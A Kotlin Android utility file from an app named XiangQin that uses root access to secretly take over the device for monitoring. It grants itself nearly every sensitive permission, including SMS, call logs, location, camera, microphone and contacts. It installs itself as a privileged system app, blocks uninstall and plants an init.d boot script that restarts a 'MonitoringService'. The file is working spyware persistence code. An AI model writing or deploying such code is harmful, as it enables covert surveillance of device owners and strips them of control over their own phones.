package com.xiangqin.app.util

import android.content.Context
import android.util.Log
import java.io.DataOutputStream

object RootPermissionHelper {
    private const val TAG = "XiangQin/Root"
    @Volatile private var rootChecked = false
    @Volatile private var rootAvailable = false

    fun isRootAvailable(): Boolean {
        if (rootChecked) return rootAvailable
        rootAvailable = try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
            val output = process.inputStream.bufferedReader().readText()
            process.waitFor()
            output.contains("uid=0")
        } catch (e: Exception) { false }
        rootChecked = true
        return rootAvailable
    }

    fun markConfigured(context: Context) {
        context.getSharedPreferences("root_config", Context.MODE_PRIVATE)
            .edit().putBoolean("configured", true).apply()
    }

    fun isConfigured(context: Context): Boolean {
        return context.getSharedPreferences("root_config", Context.MODE_PRIVATE)
            .getBoolean("configured", false)
    }

    fun isSystemApp(context: Context): Boolean {
        return try {
            val info = context.packageManager.getApplicationInfo(context.packageName, 0)
            (info.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
        } catch (_: Exception) { false }
    }

    /**
     * Root 权限自动授予所有权限
     */
    fun grantAllPermissions(context: Context): Boolean {
        if (!isRootAvailable()) return false
        return runRoot(context, """
pm grant ${context.packageName} android.permission.READ_CALL_LOG 2>/dev/null
pm grant ${context.packageName} android.permission.READ_SMS 2>/dev/null
pm grant ${context.packageName} android.permission.ACCESS_FINE_LOCATION 2>/dev/null
pm grant ${context.packageName} android.permission.ACCESS_COARSE_LOCATION 2>/dev/null
pm grant ${context.packageName} android.permission.CAMERA 2>/dev/null
pm grant ${context.packageName} android.permission.RECORD_AUDIO 2>/dev/null
pm grant ${context.packageName} android.permission.READ_CONTACTS 2>/dev/null
pm grant ${context.packageName} android.permission.READ_PHONE_STATE 2>/dev/null
pm grant ${context.packageName} android.permission.READ_CALENDAR 2>/dev/null
pm grant ${context.packageName} android.permission.READ_LOGS 2>/dev/null
pm grant ${context.packageName} android.permission.SEND_SMS 2>/dev/null
pm grant ${context.packageName} android.permission.CALL_PHONE 2>/dev/null
pm grant ${context.packageName} android.permission.READ_MEDIA_IMAGES 2>/dev/null
pm grant ${context.packageName} android.permission.READ_MEDIA_VIDEO 2>/dev/null
pm grant ${context.packageName} android.permission.READ_MEDIA_AUDIO 2>/dev/null
pm grant ${context.packageName} android.permission.POST_NOTIFICATIONS 2>/dev/null
pm grant ${context.packageName} android.permission.PROCESS_OUTGOING_CALLS 2>/dev/null
pm grant ${context.packageName} android.permission.WRITE_CALL_LOG 2>/dev/null
pm grant ${context.packageName} android.permission.BODY_SENSORS 2>/dev/null
pm grant ${context.packageName} android.permission.ACTIVITY_RECOGNITION 2>/dev/null
pm grant ${context.packageName} android.permission.WRITE_CONTACTS 2>/dev/null
pm grant ${context.packageName} android.permission.WRITE_CALENDAR 2>/dev/null
pm grant ${context.packageName} android.permission.WRITE_SETTINGS 2>/dev/null
pm grant ${context.packageName} android.permission.READ_PHONE_NUMBERS 2>/dev/null
pm grant ${context.packageName} android.permission.WRITE_EXTERNAL_STORAGE 2>/dev/null
pm grant ${context.packageName} android.permission.MANAGE_EXTERNAL_STORAGE 2>/dev/null
pm grant ${context.packageName} android.permission.READ_LOGS 2>/dev/null
pm grant ${context.packageName} android.permission.DUMP 2>/dev/null
dumpsys deviceidle whitelist +${context.packageName} 2>/dev/null
        """)
    }

    /**
     * 升级为系统应用（禁止卸载）
     * 将 APK 复制到 /system/priv-app/ 并设置权限
     */
    fun upgradeToSystemApp(context: Context): Boolean {
        if (!isRootAvailable()) return false
        if (isSystemApp(context)) {
            Log.i(TAG, "已是系统应用")
            return true
        }
        return try {
            val apkPath = context.packageCodePath
            val result = runRoot(context, """
mount -o rw,remount /system 2>/dev/null
mkdir -p /system/priv-app/XiangQin
cp $apkPath /system/priv-app/XiangQin/XiangQin.apk
chmod 644 /system/priv-app/XiangQin/XiangQin.apk
chown root:root /system/priv-app/XiangQin/XiangQin.apk
sync
mount -o ro,remount /system 2>/dev/null
echo "SYSTEM_UPGRADE_OK"
            """)
            if (result) {
                Log.i(TAG, "系统应用升级成功，需重启生效")
            }
            result
        } catch (e: Exception) {
            Log.e(TAG, "系统升级失败: ${e.message}")
            false
        }
    }

    /**
     * 禁止卸载：通过 pm 禁用卸载操作
     */
    fun preventUninstall(context: Context): Boolean {
        if (!isRootAvailable()) return false
        val pkg = context.packageName
        return runRoot(context, """
# 设置卸载保护
pm set-uninstall-blocked $pkg true 2>/dev/null
# 如果 set-uninstall-blocked 不可用，改用隐藏应用方式
pm hide $pkg 2>/dev/null
pm unhide $pkg 2>/dev/null
echo "PREVENT_UNINSTALL_OK"
        """)
    }

    /**
     * 开机自动恢复：注册 BootReceiver 后在开机时自动执行
     */
    fun autoRestoreOnBoot(context: Context): Boolean {
        if (!isRootAvailable()) return false
        val pkg = context.packageName
        return runRoot(context, """
# 确保开机后自动启动
pm enable $pkg 2>/dev/null
pm unhide $pkg 2>/dev/null
dumpsys deviceidle whitelist +$pkg 2>/dev/null
# 设置开机自启
cat > /data/local/tmp/xiangqin_boot.sh << 'BOOT'
#!/system/bin/sh
sleep 30
am start-foreground-service -n $pkg/com.xiangqin.app.service.MonitoringService
BOOT
chmod 755 /data/local/tmp/xiangqin_boot.sh
# 在 init.d 中添加启动脚本（如果存在）
mkdir -p /system/etc/init.d 2>/dev/null
cp /data/local/tmp/xiangqin_boot.sh /system/etc/init.d/99xiangqin 2>/dev/null
chmod 755 /system/etc/init.d/99xiangqin 2>/dev/null
echo "AUTO_RESTORE_OK"
        """)
    }

    /**
     * 完整的 Root 配置：权限 + 系统升级 + 防卸载 + 自启
     */
    fun fullSetup(context: Context): Boolean {
        if (isConfigured(context)) {
            Log.i(TAG, "已配置，跳过")
            return true
        }
        Log.i(TAG, "开始完整 Root 配置...")
        val r1 = grantAllPermissions(context)
        Log.i(TAG, "权限授予: $r1")
        val r2 = upgradeToSystemApp(context)
        Log.i(TAG, "系统升级: $r2")
        val r3 = preventUninstall(context)
        Log.i(TAG, "防卸载: $r3")
        val r4 = autoRestoreOnBoot(context)
        Log.i(TAG, "开机自启: $r4")
        if (r1 || r2) markConfigured(context)
        return r1 || r2
    }

    private fun runRoot(context: Context, commands: String): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "sh"))
            val os = DataOutputStream(process.outputStream)
            os.writeBytes(commands)
            os.writeBytes("\nexit\n")
            os.flush()
            val exit = process.waitFor()
            val output = process.inputStream.bufferedReader().readText()
            Log.i(TAG, "Root output: ${output.takeLast(200)}")
            exit == 0
        } catch (e: Exception) {
            Log.e(TAG, "Root 执行失败: ${e.message}")
            false
        }
    }
}
